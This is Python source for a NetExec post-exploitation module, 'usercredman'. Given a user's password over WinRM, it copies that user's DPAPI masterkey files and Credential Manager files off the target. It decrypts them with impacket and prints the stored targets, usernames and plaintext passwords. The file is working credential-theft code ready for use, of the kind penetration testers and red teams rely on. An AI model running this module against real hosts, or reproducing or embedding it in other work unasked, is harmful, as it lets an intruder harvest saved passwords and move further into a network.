import ntpath
from io import StringIO
from nxc.paths import TMP_PATH
from dploot.lib.utils import is_guid, is_credfile
from impacket.dpapi import MasterKeyFile, MasterKey, CredHist, DomainKey, CredentialFile, deriveKeysFromUser, DPAPI_BLOB, CREDENTIAL_BLOB


class NXCModule:
    """
    Find and unlock Credential Manager masterkeys and credentials owned by user.
    The flow is inspired by and a simplified version of dploot's triage methods for user masterkeys and credentials.
    Actual decryption of keys and credentials is taken and adapted from impacket-dpapi.

    Module by Tiago Nunes (@tiagomanunes)
    """

    name = "usercredman"
    description = "Find and unlock Credential Manager masterkeys and credentials owned by user."
    supported_protocols = ["winrm"]
    opsec_safe = True
    multiple_hosts = True

    def __init__(self):
        self.context = None
        self.module_options = None

    def options(self, context, module_options):
        """No options"""

    def on_login(self, context, connection):
        """Concurrent."""
        user_masterkey_path = ntpath.join("C:\\Users", connection.username, "AppData\\Roaming\\Microsoft\\Protect")
        user_credentials_paths = [
            ntpath.join("C:\\Users", connection.username, "AppData\\Roaming\\Microsoft\\Credentials"),
            ntpath.join("C:\\Users", connection.username, "AppData\\Local\\Microsoft\\Credentials")
        ] 

        sids = connection.ps_execute(f"Get-ChildItem -Path {user_masterkey_path} -Name -Directory -Include 'S-*'", True)
        if not sids:
            context.log.fail(f"No masterkeys found for user {connection.username}")
            return

        masterkeys = []
        for sid in StringIO(sids).readlines():
            keys_path = ntpath.join(user_masterkey_path, sid.strip())
            keys = connection.ps_execute(f"Get-ChildItem -Path {keys_path} -Name -Hidden -File -Exclude 'Preferred'", True)
            for key in StringIO(keys).readlines():
                stripped_key = key.strip()
                if is_guid(stripped_key):
                    key_path = ntpath.join(keys_path, stripped_key)
                    context.log.display(f"Found masterkey file {key_path}")
                    local_key_file = f"{TMP_PATH}/{stripped_key}"
                    connection.conn.fetch(key_path, local_key_file)
                    decrypted_key = self.get_master_key(context, local_key_file, sid, connection.password, connection.args.verbose)
                    if decrypted_key:
                        masterkeys.append(decrypted_key)

        if not masterkeys:
            context.log.fail("Could not decrypt any keys")
            return

        credential_files = []
        for user_credentials_path in user_credentials_paths:
            creds = connection.ps_execute(f"Get-ChildItem -Path {user_credentials_path} -Name -Hidden -File", True)
            for cred_file in StringIO(creds).readlines():
                stripped_cred_file = cred_file.strip()
                if is_credfile(stripped_cred_file):
                    creds_path = ntpath.join(user_credentials_path, stripped_cred_file)
                    context.log.display(f"Found credentials file {creds_path}")
                    local_cred_file = f"{TMP_PATH}/{stripped_cred_file}"
                    connection.conn.fetch(creds_path, local_cred_file)
                    credential_files.append(local_cred_file)

        if not credential_files:
            context.log.fail(f"No credential files found for user {connection.username}")
            return

        for creds_file in credential_files:
            for masterkey in masterkeys:
                with open(creds_file, "rb") as fp:
                    data = fp.read()
                cred = CredentialFile(data)
                blob = DPAPI_BLOB(cred["Data"])

                decrypted = blob.decrypt(masterkey)
                if decrypted is not None:
                    context.log.success(f"Successfully decrypted credentials in {creds_file}:")
                    creds = CREDENTIAL_BLOB(decrypted)
                    target = creds["Target"].decode("utf-16le")
                    username = creds["Username"].decode("utf-16le")
                    try:
                        password = creds["Unknown3"].decode("utf-16le")
                    except UnicodeDecodeError:
                        password = creds["Unknown3"].decode("latin-1")
                    context.log.highlight(f"{target} - {username}:{password}")

                    if connection.args.verbose:
                        creds.dump()

    def get_master_key(self, context, masterkey_file, sid, password, verbose):
        """
        Taken and adapted from impacket.examples.dpapi
        Could be cleaned up but the more we deviate from the original the harder it will be to maintain it
        """
        with open(masterkey_file, "rb") as fp:
            data = fp.read()
        mkf = MasterKeyFile(data)
        if verbose:
            mkf.dump()
        data = data[len(mkf):]

        if mkf["MasterKeyLen"] > 0:
            mk = MasterKey(data[:mkf["MasterKeyLen"]])
            data = data[len(mk):]

        if mkf["BackupKeyLen"] > 0:
            bkmk = MasterKey(data[:mkf["BackupKeyLen"]])
            data = data[len(bkmk):]

        if mkf["CredHistLen"] > 0:
            ch = CredHist(data[:mkf["CredHistLen"]])
            data = data[len(ch):]

        if mkf["DomainKeyLen"] > 0:
            dk = DomainKey(data[:mkf["DomainKeyLen"]])
            data = data[len(dk):]

        key1, key2, key3 = deriveKeysFromUser(sid, password)

        # if mkf['flags'] & 4 ? SHA1 : MD4
        decryptedKey = mk.decrypt(key3)
        if decryptedKey:
            context.log.success("Decrypted key with User Key (MD4 protected)")
            return decryptedKey

        decryptedKey = mk.decrypt(key2)
        if decryptedKey:
            context.log.success("Decrypted key with User Key (MD4)")
            return decryptedKey

        decryptedKey = mk.decrypt(key1)
        if decryptedKey:
            context.log.success("Decrypted key with User Key (SHA1)")
            return decryptedKey

        decryptedKey = bkmk.decrypt(key3)
        if decryptedKey:
            context.log.success("Decrypted Backup key with User Key (MD4 protected)")
            return decryptedKey

        decryptedKey = bkmk.decrypt(key2)
        if decryptedKey:
            context.log.success("Decrypted Backup key with User Key (MD4)")
            return decryptedKey

        decryptedKey = bkmk.decrypt(key1)
        if decryptedKey:
            context.log.success("Decrypted Backup key with User Key (SHA1)")
            return decryptedKey

        return None
        
